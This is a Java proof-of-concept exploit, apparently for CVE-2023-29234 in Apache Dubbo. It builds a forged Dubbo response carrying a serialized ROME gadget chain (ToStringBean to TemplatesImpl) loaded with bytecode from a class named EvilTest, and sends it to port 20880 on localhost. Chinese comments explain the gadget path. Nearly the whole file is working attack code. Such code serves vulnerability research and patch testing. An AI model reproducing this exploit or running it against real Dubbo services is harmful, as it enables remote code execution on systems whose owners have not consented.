package top.lz2y.vul;

import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaObjectOutput;
import org.apache.dubbo.common.serialize.nativejava.NativeJavaSerialization;
import org.apache.dubbo.remoting.exchange.Response;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;

import javax.xml.transform.Templates;
import java.io.OutputStream;
import java.net.Socket;

import static org.apache.dubbo.rpc.protocol.dubbo.DubboCodec.RESPONSE_WITH_EXCEPTION;

public class CVE202329234 {
    protected static final int HEADER_LENGTH = 16;
    protected static final short MAGIC = (short) 0xdabb;

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream boos = new ByteArrayOutputStream();
        ByteArrayOutputStream nativeJavaBoos = new ByteArrayOutputStream();
        Serialization serialization = new NativeJavaSerialization();
        NativeJavaObjectOutput out = new NativeJavaObjectOutput(nativeJavaBoos);

        byte[] header = new byte[HEADER_LENGTH];
        Bytes.short2bytes(MAGIC, header);
        header[2] = serialization.getContentTypeId();

        header[3] = Response.OK;
        Bytes.long2bytes(1, header, 4);

        // payload的生成，因为这里的入口点是toString，所以我们也只需要rome链从ToStringBean.toString开始的部分
        // gadget为：ToStringBean.toString() -> TemplatesImpl#getOutputProperties()
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath("target/classes");
        CtClass clazzz = pool.get("top.lz2y.vul.EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        ToStringBean exp = new ToStringBean(Templates.class, templates);
        out.writeByte(RESPONSE_WITH_EXCEPTION);
        out.writeObject(exp);

        out.flushBuffer();

        Bytes.int2bytes(nativeJavaBoos.size(), header, 12);
        boos.write(header);
        boos.write(nativeJavaBoos.toByteArray());

        byte[] responseData = boos.toByteArray();

        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(responseData);
        outputStream.flush();
        outputStream.close();
    }

}
